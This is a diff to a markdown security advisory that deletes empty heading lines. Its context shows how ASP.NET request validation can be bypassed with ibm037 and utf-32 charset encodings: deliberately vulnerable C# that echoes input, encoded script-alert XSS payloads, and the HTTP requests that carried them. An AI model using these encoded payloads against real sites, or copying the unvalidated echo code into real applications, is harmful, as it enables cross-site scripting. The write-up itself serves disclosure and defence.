@@ -83,8 +83,6 @@ Four days later, we received written permission from the MSRC team to share this
 
 It is strongly recommended that your application explicitly check all inputs it uses in addition to the request validation performed by ASP.NET. The request validation feature cannot catch all attacks, especially those crafted specifically against your application logic.
 
-##
-
 ## Description
 
 The following vulnerable code in C# and VB.NET simulate this bypass scenario:
@@ -108,8 +106,6 @@ catch(Exception ex)
 Response.Write(Request.QueryString["input0"]);
 Response.Write(Request.Form["input1"]);
 %>
-
-###
 
 ### VB code
 
@@ -140,8 +136,6 @@ The result of encoding our input parameters using *ibm037* was:
 ==for input1=<script>alert(1)</script>==
 %89%95%97%A4%A3%F1=L%A2%83%99%89%97%A3n%81%93%85%99%A3M%F1%5DLa%A2%83%99%89%97%A3n
 
-##
-
 ## Sending payload in the URL using POST
 
 In order to bypass request validation using a parameter in the URL, the following request was sent to the server. Note that the HTTP verb was set to POST rather than GET; the body of the request was not important and did not contain a payload in this case (the GET verb was blocked):
@@ -166,8 +160,6 @@ Date: Tue, 22 Aug 2017 19:33:35 GMT
 Content-Length: 28
 
 **<script>alert(0)</script>???**
-
-##
 
 ## Sending payload in the POST body using GET
 
@@ -214,8 +206,6 @@ Content-Type: application/x-www-form-urlencoded; charset=**utf-32**
 Content-Length: 325
 
 i%00%00%00n%00%00%00p%00%00%00u%00%00%00t%00%00%001%00%00%00=%3C%00%00%00s%00%00%00c%00%00%00r%00%00%00i%00%00%00p%00%00%00t%00%00%00%3E%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00%28%00%00%001%00%00%00%29%00%00%00%3C%00%00%00%2F%00%00%00s%00%00%00c%00%00%00r%00%00%00i%00%00%00p%00%00%00t%00%00%00%3E%00%00%00
-
-##
 
 ## Conclusion
 
